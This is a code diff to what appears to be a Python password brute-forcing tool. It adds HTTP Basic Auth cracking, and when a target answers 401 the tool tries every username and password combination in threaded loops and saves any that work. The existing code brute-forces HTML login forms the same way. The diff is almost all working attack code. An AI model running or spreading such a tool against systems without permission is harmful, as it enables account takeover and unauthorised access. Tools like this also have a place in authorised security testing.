@@ -29,6 +29,18 @@ def send_login(browser, url, username, password, result):
         return False
 
 
+def send_basic_auth(browser, url, username, password, result):
+    printg(f"Username: \033[96m{username:29.29}\033[0m Password: \033[95m{password:29.29}\033[0m")
+    resp = browser.open(url, auth=(username, password))
+    if resp.status_code == 401:
+        pass
+    elif resp.status_code >= 400:
+        print_error(f"{resp.status_code} for \"\033[96m{username}\033[0m\":\"\033[95m{password}\033[0m\"")
+    else:
+        print_found(username, password)
+        result.put([url, username, password])
+
+
 def run_threads(threads):
     for thread in threads:
         thread.start()
@@ -37,7 +49,7 @@ def run_threads(threads):
         thread.join()
 
 
-def setup_threads(browser, url, options, result):
+def setup_threads(browser, url, options, result, target=send_login):
     workers = []
     for username in options.userlist:
         for password in options.passlist:
@@ -48,7 +60,7 @@ def setup_threads(browser, url, options, result):
                     return
                 run_threads(workers)
                 del workers[:]
-            worker = threading.Thread(target=send_login, args=(browser, url, username, password, result))
+            worker = threading.Thread(target=target, args=(browser, url, username, password, result))
             worker.daemon = True
             workers.append(worker)
     if workers:
@@ -81,21 +93,24 @@ def do_attack(options):
         print_attack(url)
         browser = Browser()
         try:
-            browser.open(url)
-            login_form = browser.find_login_form()
-            if login_form:
-                browser.login_form = login_form
-                if browser.login_form.entry_text:
-                    # If login form contains both entry_text and entry_password
-                    if not options.userlist:
-                        print_error(f"Username is required for current URL")
-                    else:
-                        setup_threads(browser, url, options, result)
-                else:
-                    # Only password, we setup different
-                    setup_threads_no_username(browser, url, options, result)
+            resp = browser.open(url)
+            if resp.status_code == 401:
+                setup_threads(browser, url, options, result, target=send_basic_auth)
             else:
-                print_no_login_found(url)
+                login_form = browser.find_login_form()
+                if login_form:
+                    browser.login_form = login_form
+                    if browser.login_form.entry_text:
+                        # If login form contains both entry_text and entry_password
+                        if not options.userlist:
+                            print_error(f"Username is required for current URL")
+                        else:
+                            setup_threads(browser, url, options, result)
+                    else:
+                        # Only password, we setup different
+                        setup_threads_no_username(browser, url, options, result)
+                else:
+                    print_no_login_found(url)
         except KeyboardInterrupt:
             exit(0)
         finally:
